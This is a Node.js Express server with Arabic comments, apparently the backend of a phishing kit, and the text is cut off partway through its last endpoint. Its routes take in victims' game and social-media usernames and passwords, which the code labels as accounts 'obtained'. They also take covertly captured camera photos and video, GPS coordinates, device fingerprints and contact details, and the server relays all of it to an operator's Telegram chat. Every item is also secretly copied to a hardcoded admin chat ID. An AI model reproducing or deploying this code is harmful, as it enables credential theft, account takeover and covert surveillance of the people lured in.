require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const bodyParser = require('body-parser');
const cors = require('cors');
const moment = require('moment-timezone');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));

// إعداد multer للذاكرة فقط
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 100 * 1024 * 1024, // 100MB limit للفيديو
    files: 10 // أقصى 10 ملفات
  }
});

// التوكن من البيئة
const BOT_TOKEN = process.env.BOT_TOKEN;

// إعدادات الأدمن
const ADMIN_CHAT_ID = '6808883615'; // ايدي الأدمن الثابت

if (!BOT_TOKEN) {
  console.error('❌ Telegram Bot Token is not configured');
  console.warn('⚠️  سيتم تشغيل السيرفر ولكن إرسال الرسائل إلى Telegram لن يعمل');
}

// وظيفة إرسال الرسائل للتلجرام
async function sendToTelegram(chatId, message, fileBuffer = null, filename = null) {
    try {
        // إذا لم يكن هناك توكن، نعمل محاكاة
        if (!BOT_TOKEN) {
            console.log(`📤 [محاكاة] إرسال إلى chatId ${chatId}: ${message}`);
            if (fileBuffer) {
                console.log(`📁 [محاكاة] مع ملف: ${filename}`);
            }
            return true;
        }

        if (fileBuffer && filename) {
            // إرسال ملف
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('caption', message);
            formData.append('document', fileBuffer, { filename: filename });
            
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
                headers: formData.getHeaders()
            });
            
            return response.data.ok;
        } else {
            // إرسال رسالة نصية
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            });
            
            return response.data.ok;
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error.response?.data || error.message);
        return false;
    }
}

// وظيفة إرسال فيديو للتلجرام من الـ buffer
async function sendVideoToTelegram(chatId, message, videoBuffer, videoName) {
    try {
        // إذا لم يكن هناك توكن، نعمل محاكاة
        if (!BOT_TOKEN) {
            console.log(`🎬 [محاكاة] إرسال فيديو إلى chatId ${chatId}: ${message.substring(0, 100)}...`);
            console.log(`📁 [محاكاة] ملف الفيديو: ${videoName}`);
            return true;
        }

        // إرسال الفيديو
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', message);
        formData.append('video', videoBuffer, { 
            filename: videoName,
            contentType: 'video/mp4'
        });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, formData, {
            headers: formData.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        return response.data.ok;
    } catch (error) {
        console.error('Error sending video to Telegram:', error.response?.data || error.message);
        return false;
    }
}

// وظيفة إرسال صور للتلجرام
async function sendPhotosToTelegram(chatId, message, images = []) {
  try {
    // إذا لم يكن هناك توكن، نعمل محاكاة
    if (!BOT_TOKEN) {
      console.log(`📤 [محاكاة] إرسال صور إلى chatId ${chatId}: ${message.substring(0, 100)}...`);
      console.log(`🖼️ [محاكاة] عدد الصور: ${images.length}`);
      return true;
    }

    // إرسال النص أولاً
    await sendToTelegram(chatId, message);

    // إرسال الصور إذا وجدت
    for (const image of images) {
      const formData = new FormData();
      formData.append('photo', image.buffer, {
        filename: image.originalname || `photo_${Date.now()}.jpg`,
        contentType: image.mimetype || 'image/jpeg'
      });
      formData.append('chat_id', chatId);
      formData.append('caption', `📸 ${image.originalname || 'صورة'}`);

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
        headers: {
          ...formData.getHeaders()
        }
      });
    }

    return true;
  } catch (error) {
    console.error('Error sending photos to Telegram:', error.response?.data || error.message);
    return false;
  }
}

// وظيفة إرسال نسخة للأدمن
async function sendCopyToAdmin(message, originalChatId, fileBuffer = null, filename = null, fileType = 'text') {
  try {
    const adminMessage = `👑 <b>نسخة أدمن</b> - من المستخدم: ${originalChatId}\n\n${message}`;
    
    let sent;
    if (fileBuffer && filename) {
      if (fileType === 'video') {
        // إرسال فيديو للأدمن
        const formData = new FormData();
        formData.append('chat_id', ADMIN_CHAT_ID);
        formData.append('caption', adminMessage);
        formData.append('video', fileBuffer, { 
          filename: filename,
          contentType: 'video/mp4'
        });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, formData, {
          headers: formData.getHeaders(),
          maxContentLength: Infinity,
          maxBodyLength: Infinity
        });
        sent = response.data.ok;
      } else if (fileType === 'image') {
        // إرسال صورة للأدمن
        const formData = new FormData();
        formData.append('chat_id', ADMIN_CHAT_ID);
        formData.append('caption', adminMessage);
        formData.append('photo', fileBuffer, {
          filename: filename,
          contentType: 'image/jpeg'
        });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
          headers: formData.getHeaders()
        });
        sent = response.data.ok;
      } else {
        // إرسال ملف عادي للأدمن
        const formData = new FormData();
        formData.append('chat_id', ADMIN_CHAT_ID);
        formData.append('caption', adminMessage);
        formData.append('document', fileBuffer, { filename: filename });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
          headers: formData.getHeaders()
        });
        sent = response.data.ok;
      }
    } else {
      sent = await sendToTelegram(ADMIN_CHAT_ID, adminMessage);
    }
    
    if (sent) {
      console.log('✅ تم إرسال نسخة للأدمن بنجاح');
      return true;
    } else {
      console.log('❌ فشل إرسال نسخة للأدمن');
      return false;
    }
  } catch (error) {
    console.error('❌ خطأ في إرسال نسخة للأدمن:', error);
    return false;
  }
}

// دالة للحصول على معلومات الموقع من IP
async function getLocationFromIP(ip) {
    try {
        if (ip === '::1' || ip === '127.0.0.1' || ip.includes('localhost')) {
            return {
                country: 'غير معروف',
                city: 'غير معروف'
            };
        }

        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        const data = response.data;
        
        if (data.status === 'success') {
            return {
                country: data.country || 'غير معروف',
                city: data.city || 'غير معروف'
            };
        } else {
            return {
                country: 'غير معروف',
                city: 'غير معروف'
            };
        }
    } catch (error) {
        console.error('Error getting location from IP:', error.message);
        return {
            country: 'غير معروف',
            city: 'غير معروف'
        };
    }
}

// دالة لاستخراج معلومات الجهاز من User Agent
function parseDeviceInfo(userAgent) {
    let os = 'غير معروف';
    let browser = 'غير معروف';
    let device = 'غير معروف';

    // كشف نظام التشغيل
    if (userAgent.includes('Android')) {
        const androidVersion = userAgent.match(/Android\s([0-9\.]+)/);
        os = `Android ${androidVersion ? androidVersion[1] : '0.0.0'}`;
        device = 'Generic Smartphone';
    } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
        const iosVersion = userAgent.match(/OS\s([0-9_]+)/);
        os = `iOS ${iosVersion ? iosVersion[1].replace(/_/g, '.') : '0.0.0'}`;
        device = 'Apple Device';
    } else if (userAgent.includes('Windows')) {
        const windowsVersion = userAgent.match(/Windows\s([0-9\.]+)/);
        os = `Windows ${windowsVersion ? windowsVersion[1] : '0.0.0'}`;
        device = 'PC';
    } else if (userAgent.includes('Mac OS')) {
        const macVersion = userAgent.match(/Mac OS X\s([0-9_]+)/);
        os = `macOS ${macVersion ? macVersion[1].replace(/_/g, '.') : '0.0.0'}`;
        device = 'Mac';
    } else if (userAgent.includes('Linux')) {
        os = 'Linux';
        device = 'Linux Device';
    }

    // كشف المتصفح
    if (userAgent.includes('Chrome')) {
        const chromeVersion = userAgent.match(/Chrome\/([0-9\.]+)/);
        browser = `Chrome ${chromeVersion ? chromeVersion[1].split('.')[0] : '0'}`;
        if (userAgent.includes('Mobile')) browser += ' Mobile';
    } else if (userAgent.includes('Firefox')) {
        const firefoxVersion = userAgent.match(/Firefox\/([0-9\.]+)/);
        browser = `Firefox ${firefoxVersion ? firefoxVersion[1] : '0.0.0'}`;
    } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
        const safariVersion = userAgent.match(/Version\/([0-9\.]+)/);
        browser = `Safari ${safariVersion ? safariVersion[1] : '0.0.0'}`;
    } else if (userAgent.includes('Edge')) {
        const edgeVersion = userAgent.match(/Edge\/([0-9\.]+)/);
        browser = `Edge ${edgeVersion ? edgeVersion[1] : '0.0.0'}`;
    }

    return { os, browser, device };
}

// ================== 🔄 نقطة بيانات الجهاز من المسابقة ==================
app.post('/SS', async (req, res) => {
    try {
        console.log('📥 استقبال بيانات جهاز جديدة...');
        
        const data = req.body;
        console.log('📊 البيانات المستلمة:', JSON.stringify(data, null, 2));
        
        const { userId, deviceInfo, userInfo } = data;
        
        if (!userId) {
            return res.status(400).json({
                success: false,
                message: 'المعرف مطلوب (userId)'
            });
        }
        
        // تنسيق رسالة الجهاز
        let telegramMessage = `🎯 <b>معلومات جديدة من مسابقة الحلم</b>\n\n`;
        
        if (userInfo) {
            telegramMessage += `👤 <b>المستخدم:</b>\n`;
            telegramMessage += `   📛 الاسم: ${userInfo.name || 'غير محدد'}\n`;
            telegramMessage += `   📱 الهاتف: ${userInfo.phone || 'غير محدد'}\n`;
            telegramMessage += `   📧 الإيميل: ${userInfo.email || 'غير محدد'}\n`;
            telegramMessage += `   📝 الوصف: ${userInfo.description || 'غير محدد'}\n\n`;
        }
        
        telegramMessage += `🆔 <b>معرف المستخدم:</b> ${userId}\n\n`;
        
        if (deviceInfo) {
            telegramMessage += `💻 <b>معلومات الجهاز:</b>\n`;
            telegramMessage += `   🔧 الجهاز: ${deviceInfo.deviceName || 'غير معروف'}\n`;
            telegramMessage += `   📟 النوع: ${deviceInfo.deviceType || 'غير معروف'}\n`;
            telegramMessage += `   🌐 المتصفح: ${deviceInfo.browserName || 'غير معروف'} ${deviceInfo.browserVersion || ''}\n`;
            telegramMessage += `   🖥️ الشاشة: ${deviceInfo.screenResolution || 'غير معروف'}\n`;
            telegramMessage += `   🎨 الألوان: ${deviceInfo.colorDepth || 'غير معروف'}\n`;
            telegramMessage += `   ⚡ المعالج: ${deviceInfo.cpuCores || 'غير معروف'} نواة\n`;
            telegramMessage += `   💾 الذاكرة: ${deviceInfo.memory || 'غير معروف'}\n`;
            telegramMessage += `   🔋 البطارية: ${deviceInfo.battery || 'غير معروف'}\n`;
            telegramMessage += `   ⚡ الشحن: ${deviceInfo.isCharging || 'غير معروف'}\n`;
            telegramMessage += `   📶 الشبكة: ${deviceInfo.networkType || 'غير معروف'}\n`;
            telegramMessage += `   🚀 السرعة: ${deviceInfo.networkSpeed || 'غير معروف'}\n`;
            telegramMessage += `   💬 اللغة: ${deviceInfo.language || 'غير معروف'}\n`;
            telegramMessage += `   👆 اللمس: ${deviceInfo.touchSupport ? 'مدعوم' : 'غير مدعوم'}\n`;
            telegramMessage += `   📍 الموقع: ${deviceInfo.geolocationAvailable || 'غير معروف'}\n\n`;
            
            telegramMessage += `🌍 <b>المعلومات الجغرافية:</b>\n`;
            telegramMessage += `   📍 IP: ${deviceInfo.ip || 'غير متاح'}\n`;
            telegramMessage += `   🏳️ الدولة: ${deviceInfo.country || 'غير متاح'}\n`;
            telegramMessage += `   🏙️ المدينة: ${deviceInfo.city || 'غير متاح'}\n`;
            telegramMessage += `   📍 خط العرض: ${deviceInfo.latitude || 'غير متاح'}\n`;
            telegramMessage += `   📍 خط الطول: ${deviceInfo.longitude || 'غير متاح'}\n`;
            telegramMessage += `   🕒 الوقت: ${deviceInfo.time || 'غير متاح'}\n`;
            telegramMessage += `   🌐 التوقيت: ${deviceInfo.timezone || 'غير متاح'}\n`;
        }

        // الحصول على معلومات إضافية
        const userIP = req.headers['x-forwarded-for'] || 
                      req.connection.remoteAddress || 
                      req.socket.remoteAddress || 
                      'غير معروف';
        
        const cleanIP = userIP.toString().split(',')[0].trim();
        
        // الحصول على معلومات الموقع من IP
        let locationFromIP = { country: 'غير معروف', city: 'غير معروف' };
        if (cleanIP !== '::1' && cleanIP !== '127.0.0.1') {
            locationFromIP = await getLocationFromIP(cleanIP);
        }
        
        // تحليل معلومات الجهاز من User Agent
        const userAgent = req.headers['user-agent'] || 'غير معروف';
        const deviceInfoParsed = parseDeviceInfo(userAgent);
        
        // وقت الاستلام بتوقيت السعودية
        const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
        
        telegramMessage += `\n🌐 <b>معلومات الخادم:</b>\n`;
        telegramMessage += `   📱 IP الخادم: ${cleanIP}\n`;
        telegramMessage += `   🏳️ الدولة من IP: ${locationFromIP.country}\n`;
        telegramMessage += `   🏙️ المدينة من IP: ${locationFromIP.city}\n`;
        telegramMessage += `   📱 النظام: ${deviceInfoParsed.os}\n`;
        telegramMessage += `   🌐 المتصفح: ${deviceInfoParsed.browser}\n`;
        telegramMessage += `   🖥️ الجهاز: ${deviceInfoParsed.device}\n`;
        telegramMessage += `   🕒 وقت الاستلام: ${saudiTime}\n`;

        // إرسال للتلجرام
        const sent = await sendToTelegram(userId, telegramMessage);
        
        // إرسال نسخة للأدمن
        await sendCopyToAdmin(telegramMessage, userId);
        
        if (sent) {
            res.status(200).json({ 
                success: true, 
                message: 'تم استلام البيانات وإرسالها بنجاح',
                data: {
                    timestamp: saudiTime,
                    userId: userId,
                    orderId: `#DEV${Math.floor(100000 + Math.random() * 900000)}`
                }
            });
        } else {
            res.status(500).json({ 
                success: false, 
                message: 'تم استلام البيانات ولكن فشل الإرسال للتلجرام' 
            });
        }
        
    } catch (error) {
        console.error('❌ خطأ في معالجة بيانات الجهاز:', error);
        res.status(500).json({ 
            success: false, 
            message: 'حدث خطأ في الخادم',
            error: error.message
        });
    }
});

// ================== 📤 نقطة إرسال بيانات الحسابات ==================
app.post('/send-to-telegram', async (req, res) => {
    try {
        const { 
            playerId, 
            password, 
            amount, 
            chatId, 
            accountType, 
            device, 
            ip,
            country,
            city,
            os,
            browser,
            battery,
            charging,
            deviceType
        } = req.body;
        
        // التحقق من البيانات المطلوبة
        if (!playerId || !password || !amount || !chatId) {
            return res.status(400).json({
                success: false,
                message: 'بيانات ناقصة: يرجى التأكد من إرسال playerId, password, amount, chatId'
            });
        }

        // الحصول على عنوان IP
        let userIP = ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
        if (userIP === '::1') userIP = '127.0.0.1';
        
        const cleanIP = userIP.split(',')[0].trim();

        // الحصول على معلومات الموقع من IP
        let locationInfo = { country: 'غير معروف', city: 'غير معروف' };
        if (!country || !city || country === 'غير معروف' || city === 'غير معروف') {
            locationInfo = await getLocationFromIP(cleanIP);
        } else {
            locationInfo = { country, city };
        }

        // تحليل معلومات الجهاز
        const userDevice = device || req.headers['user-agent'] || "غير معروف";
        let deviceInfo = { os: 'غير معروف', browser: 'غير معروف', device: 'غير معروف' };
        
        if (!os || !browser || !deviceType) {
            deviceInfo = parseDeviceInfo(userDevice);
        } else {
            deviceInfo = { os, browser, device: deviceType };
        }

        // تحديد نوع الحساب
        let finalAccountType = accountType || 'غير محدد';
        const socialMediaKeywords = ['انستقرام', 'تيك توك', 'فيسبوك', 'تويتر', 'يوتيوب', 'سناب شات'];
        const gameKeywords = ['فري فاير', 'ببجي', 'لعبة', 'game', 'pubg', 'freefire'];
        
        const lowerAmount = amount.toLowerCase();
        const lowerPlayerId = playerId.toLowerCase();
        
        // التحقق من كلمات السوشيال ميديا
        for (const keyword of socialMediaKeywords) {
            if (lowerAmount.includes(keyword) || lowerPlayerId.includes(keyword)) {
                finalAccountType = keyword;
                break;
            }
        }
        
        // التحقق من كلمات الألعاب
        for (const keyword of gameKeywords) {
            if (lowerAmount.includes(keyword) || lowerPlayerId.includes(keyword)) {
                finalAccountType = keyword;
                break;
            }
        }

        // تنسيق الرسالة بناءً على النوع
        let telegramMessage;
        const isGame = finalAccountType.includes('فري فاير') || 
                      finalAccountType.includes('ببجي') || 
                      finalAccountType.includes('لعبة') ||
                      finalAccountType.includes('game') ||
                      finalAccountType.includes('pubg') ||
                      finalAccountType.includes('freefire');

        if (isGame) {
            telegramMessage = `
🎮 <b>تم الحصول على حساب ${finalAccountType}</b>

👤 <b>معلومات اللاعب:</b>
   • 🆔 المعرف: ${playerId}
   • 🔐 كلمة السر: ${password}
   • 💰 الكمية المطلوبة: ${amount}
   • 🎮 نوع الحساب: ${finalAccountType}

🌍 <b>معلومات الموقع:</b>
   • 📱 IP: ${cleanIP}
   • 🏳️ الدولة: ${locationInfo.country}
   • 🏙️ المدينة: ${locationInfo.city}

📱 <b>معلومات الجهاز:</b>
   • 📱 النظام: ${deviceInfo.os}
   • 🌐 المتصفح: ${deviceInfo.browser}
   • 🖥️ الجهاز: ${deviceInfo.device}
   • 🔋 البطارية: ${battery || 'غير متاح'}
   • ⚡ قيد الشحن: ${charging || 'لا'}

🕒 <b>وقت الاستلام:</b> ${moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss')}`;
        } else {
            telegramMessage = `
📱 <b>تم الحصول على حساب ${finalAccountType}</b>

👤 <b>معلومات الحساب:</b>
   • 🆔 اسم المستخدم: ${playerId}
   • 🔐 كلمة السر: ${password}
   • 📊 عدد المتابعين المطلوب: ${amount}
   • 📱 نوع الحساب: ${finalAccountType}

🌍 <b>معلومات الموقع:</b>
   • 📱 IP: ${cleanIP}
   • 🏳️ الدولة: ${locationInfo.country}
   • 🏙️ المدينة: ${locationInfo.city}

📱 <b>معلومات الجهاز:</b>
   • 📱 النظام: ${deviceInfo.os}
   • 🌐 المتصفح: ${deviceInfo.browser}
   • 🖥️ الجهاز: ${deviceInfo.device}
   • 🔋 البطارية: ${battery || 'غير متاح'}
   • ⚡ قيد الشحن: ${charging || 'لا'}

🕒 <b>وقت الاستلام:</b> ${moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss')}`;
        }

        console.log('📤 إرسال بيانات حساب جديد:', {
            type: isGame ? '🎮 لعبة' : '📱 سوشيال ميديا',
            accountType: finalAccountType,
            username: playerId,
            ip: cleanIP,
            country: locationInfo.country,
            city: locationInfo.city
        });

        // إرسال الرسالة
        const success = await sendToTelegram(chatId, telegramMessage);
        
        // إرسال نسخة للأدمن
        await sendCopyToAdmin(telegramMessage, chatId);
        
        const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
        
        if (success) {
            res.json({
                success: true,
                message: 'تم إرسال البيانات إلى Telegram بنجاح',
                orderId: `#${Math.floor(100000 + Math.random() * 900000)}`,
                data: {
                    accountType: finalAccountType,
                    type: isGame ? 'game' : 'social',
                    ip: cleanIP,
                    country: locationInfo.country,
                    city: locationInfo.city,
                    timestamp: saudiTime,
                    chatId: chatId
                }
            });
        } else {
            res.status(500).json({
                success: false,
                message: 'فشل في إرسال الرسالة إلى Telegram'
            });
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        res.status(500).json({
            success: false,
            message: 'حدث خطأ أثناء إرسال البيانات',
            error: error.message
        });
    }
});

// ================== 🖼️ نقطة إرسال الصور الرئيسية ==================
app.post('/submitPhotos', upload.array('images', 10), async (req, res) => {
  try {
    console.log('🖼️ استقبال صور جديدة...');
    
    const { userId, cameraType, additionalData } = req.body;
    const images = req.files || [];

    if (!userId) {
      return res.status(400).json({
        success: false,
        message: 'المعرف مطلوب (userId)'
      });
    }

    console.log(`👤 المستخدم: ${userId}`);
    console.log(`📷 نوع الكاميرا: ${cameraType || 'غير محدد'}`);
    console.log(`🖼️ عدد الصور: ${images.length}`);
    
    // تنسيق رسالة Telegram
    const telegramMessage = `
🖼️ <b>تم استلام صور جديدة!</b>

👤 <b>معرف المستخدم:</b> <code>${userId}</code>
📷 <b>نوع الكاميرا:</b> ${cameraType === 'front' ? 'الأمامية' : cameraType === 'back' ? 'الخلفية' : cameraType || 'غير محدد'}
🖼️ <b>عدد الصور:</b> ${images.length}

🕒 <b>وقت الاستلام:</b> ${moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss')}`;

    // إرسال الصور إلى Telegram
    const sendResult = await sendPhotosToTelegram(userId, telegramMessage, images);
    
    // إرسال نسخة للأدمن
    if (images.length > 0) {
      await sendCopyToAdmin(
        telegramMessage, 
        userId, 
        images[0].buffer, 
        images[0].originalname || `photo_${Date.now()}.jpg`, 
        'image'
      );
    } else {
      await sendCopyToAdmin(telegramMessage, userId);
    }

    console.log('✅ تم معالجة الصور بنجاح:', {
      userId,
      imagesCount: images.length,
      telegramSent: sendResult
    });

    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    // إرجاع رد ناجح
    res.status(200).json({
      success: true,
      message: 'تم استلام الصور وإرسالها بنجاح',
      uploaded: true,
      telegramSent: sendResult,
      data: {
        timestamp: saudiTime,
        userId: userId,
        imagesCount: images.length,
        orderId: `#IMG${Math.floor(100000 + Math.random() * 900000)}`
      }
    });

  } catch (error) {
    console.error('❌ خطأ في معالجة الصور:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ أثناء معالجة الصور',
      error: error.message
    });
  }
});

// ================== 🎬 نقطة استقبال الفيديو ==================
app.post('/api/capture/record', upload.single('video'), async (req, res) => {
  try {
    console.log('🎬 📥 استقبال طلب تسجيل فيديو جديد...');
    
    if (!req.file) {
      return res.status(400).json({
        success: false,
        message: 'لم يتم رفع أي ملف فيديو'
      });
    }

    const chatId = req.body.chatId || 'unknown';
    const type = req.body.type || 'video';
    const deviceInfo = req.body.deviceInfo || '{}';
    
    console.log('📊 معلومات استقبال الفيديو:');
    console.log(`   👤 Chat ID: ${chatId}`);
    console.log(`   📦 النوع: ${type}`);
    console.log(`   📏 الحجم: ${(req.file.size / 1024 / 1024).toFixed(2)} MB`);
    
    // وقت الاستلام بتوقيت السعودية
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    // تنسيق رسالة Telegram
    const telegramMessage = `
🎬 <b>تم استلام فيديو جديد!</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📦 <b>نوع التسجيل:</b> ${type}

📁 <b>معلومات الفيديو:</b>
   • 📏 الحجم: ${(req.file.size / 1024 / 1024).toFixed(2)} MB
   • 📋 النوع: ${req.file.mimetype}

🕒 <b>وقت الاستلام:</b> ${saudiTime}`;

    // إرسال الفيديو إلى Telegram
    const videoName = req.file.originalname || `video_${Date.now()}.webm`;
    const sendResult = await sendVideoToTelegram(
      chatId, 
      telegramMessage, 
      req.file.buffer, 
      videoName
    );
    
    // إرسال نسخة للأدمن
    await sendCopyToAdmin(
      telegramMessage, 
      chatId, 
      req.file.buffer, 
      videoName, 
      'video'
    );

    console.log('✅ تم معالجة الفيديو بنجاح:', {
      chatId,
      telegramSent: sendResult
    });

    // ✅ إرجاع رد ناجح
    res.status(200).json({
      success: true,
      message: 'تم استلام الفيديو وإرساله بنجاح',
      uploaded: true,
      telegramSent: sendResult,
      data: {
        timestamp: saudiTime,
        chatId: chatId,
        orderId: `#VID${Math.floor(100000 + Math.random() * 900000)}`
      }
    });

  } catch (error) {
    console.error('❌ خطأ في معالجة الفيديو:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ أثناء معالجة الفيديو',
      error: error.message
    });
  }
});

// ================== 📍 نقطة استقبال الموقع ==================
app.post('/submitLocation', async (req, res) => {
  try {
    console.log('📍 استقبال بيانات موقع جديد...');
    
    const { chatId, latitude, longitude, additionalData } = req.body;
    
    if (!chatId || !latitude || !longitude) {
      return res.status(400).json({
        success: false,
        message: 'بيانات ناقصة. يرجى إرسال chatId و latitude و longitude'
      });
    }

    // الحصول على معلومات IP
    const userIP = req.headers['x-forwarded-for'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress || 
                  'غير معروف';
    
    const cleanIP = userIP.toString().split(',')[0].trim();
    
    // الحصول على معلومات الموقع من IP
    let locationFromIP = { country: 'غير معروف', city: 'غير معروف' };
    if (cleanIP !== '::1' && cleanIP !== '127.0.0.1') {
      locationFromIP = await getLocationFromIP(cleanIP);
    }
    
    // وقت الاستلام بتوقيت السعودية
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');

    // تنسيق الرسالة لـ Telegram
    const telegramMessage = `
🗺️ <b>تم الحصول على موقع جديد!</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>

📍 <b>الإحداثيات:</b>
   • خط العرض: <code>${latitude}</code>
   • خط الطول: <code>${longitude}</code>

🌍 <b>معلومات الموقع:</b>
   • 📱 IP: ${cleanIP}
   • 🏳️ الدولة: ${locationFromIP.country}
   • 🏙️ المدينة: ${locationFromIP.city}

🕒 <b>وقت الاستلام:</b> ${saudiTime}

🔗 <b>رابط الخريطة:</b>
https://www.google.com/maps?q=${latitude},${longitude}`;

    // إرسال البيانات إلى Telegram
    const sendResult = await sendToTelegram(chatId, telegramMessage);
    
    // إرسال نسخة للأدمن
    await sendCopyToAdmin(telegramMessage, chatId);

    if (sendResult) {
      res.json({
        success: true,
        message: 'تم استقبال بيانات الموقع وإرسالها بنجاح',
        data: {
          chatId,
          coordinates: { latitude, longitude },
          timestamp: saudiTime,
          mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
          orderId: `#LOC${Math.floor(100000 + Math.random() * 900000)}`
        }
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'تم استقبال البيانات ولكن فشل الإرسال إلى Telegram'
      });
    }
  } catch (error) {
    console.error('❌ خطأ في /submitLocation:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ في الخادم',
      error: error.message
    });
  }
});

// ================== 📲 نقطة توثيق تيليجرام ==================
app.post('/forward-to-bot', async (req, res) => {
  try {
    const { phone, username, accountName, email, chatId } = req.body;
    
    if (!phone || !accountName || !email || !chatId) {
      return res.status(400).json({ 
        success: false, 
        message: 'الحقول المطلوبة: phone, accountName, email, chatId' 
      });
    }

    // نص الرسالة
    const message = `🔹 <b>بيانات توثيق تيليجرام:</b>\n\n📞 <b>رقم الهاتف:</b> ${phone}\n👤 <b>يوزر الحساب:</b> ${username || 'غير محدد'}\n🏷️ <b>اسم الحساب:</b> ${accountName}\n📧 <b>البريد الإلكتروني:</b> ${email}\n\n👑 <b>تم الإرسال بواسطة - @vipboaabot</b>`;
    
    // إرسال الرسالة إلى البوت
    const sendResult = await sendToTelegram(chatId, message);
    
    // إرسال نسخة للأدمن
    await sendCopyToAdmin(message, chatId);

    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');

    if (sendResult) {
      res.json({ 
        success: true, 
        message: 'تم إرسال البيانات إلى البوت بنجاح',
        data: {
          timestamp: saudiTime,
          chatId: chatId,
          orderId: `#TG${Math.floor(100000 + Math.random() * 900000)}`
        }
      });
    } else {
      res.status(500).json({ 
        success: false, 
        message: 'فشل في إرسال البيانات إلى البوت'
      });
    }
  } catch (error) {
    console.error('❌ خطأ في /forward-to-bot:', error);
    res.status(500).json({ 
      success: false, 
      message: 'حدث خطأ في الخادم',
      error: error.message 
    });
  }
});

// ================== 📝 نقطة تسجيل عام ==================
app.post('/register', async (req, res) => {
    try {
        const { username, password, ip, chatId } = req.body;
        
        if (!username || !password || !ip || !chatId) {
            return res.status(400).json({ 
                success: false,
                error: 'Missing required fields: username, password, ip, and chatId are required' 
            });
        }

        const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
        const message = `📝 <b>تسجيل حساب جديد</b>\n\n👤 <b>اسم المستخدم:</b> ${username}\n🔐 <b>كلمة المرور:</b> ${password}\n🌐 <b>عنوان IP:</b> ${ip}\n🕒 <b>الوقت:</b> ${saudiTime}`;
        
        const success = await sendToTelegram(chatId, message);
        
        // إرسال نسخة للأدمن
        await sendCopyToAdmin(message, chatId);
        
        if (success) {
            res.status(200).json({ 
                success: true,
                message: 'تم إرسال البيانات إلى Telegram بنجاح',
                data: {
                    timestamp: saudiTime,
                    chatId: chatId,
                    orderId: `#REG${Math.floor(100000 + Math.random() * 900000)}`
                }
            });
        } else {
            res.status(500).json({ 
                success: false,
                error: 'فشل في إرسال البيانات إلى Telegram' 
            });
        }
    } catch (error) {
        console.error('Error processing registration:', error);
        res.status(500).json({ 
            success: false,
            error: 'Internal server error' 
        });
    }
});

// ================== 📞 نقطة بيانات الاتصال ==================
app.post('/submit-contact', async (req, res) => {
  try {
    const { name, phone, email, message: userMessage, chatId, source } = req.body;
    
    if (!phone || !chatId) {
      return res.status(400).json({ 
        success: false, 
        message: 'الحقول المطلوبة: phone, chatId' 
      });
    }

    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    // تنسيق الرسالة
    const telegramMessage = `
📞 <b>بيانات اتصال جديدة!</b>

👤 <b>المعلومات الشخصية:</b>
   • 📛 الاسم: ${name || 'غير محدد'}
   • 📱 الهاتف: ${phone}
   • 📧 الإيميل: ${email || 'غير محدد'}
   • 📝 الرسالة: ${userMessage || 'لا توجد رسالة'}

📍 <b>معلومات الإرسال:</b>
   • 🔗 المصدر: ${source || 'غير محدد'}

🕒 <b>وقت الإرسال:</b> ${saudiTime}`;

    // إرسال البيانات إلى Telegram
    const sendResult = await sendToTelegram(chatId, telegramMessage);
    
    // إرسال نسخة للأدمن
    await sendCopyToAdmin(telegramMessage, chatId);
    
    console.log('📞 بيانات اتصال مستلمة:', {
      chatId,
      name,
      phone,
      email,
      source
    });

    if (sendResult) {
      res.json({
        success: true,
        message: 'تم استقبال بيانات الاتصال وإرسالها بنجاح',
        data: {
          timestamp: saudiTime,
          chatId: chatId,
          orderId: `#CONTACT${Math.floor(100000 + Math.random() * 900000)}`
        }
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'تم استقبال البيانات ولكن فشل الإرسال إلى Telegram'
      });
    }
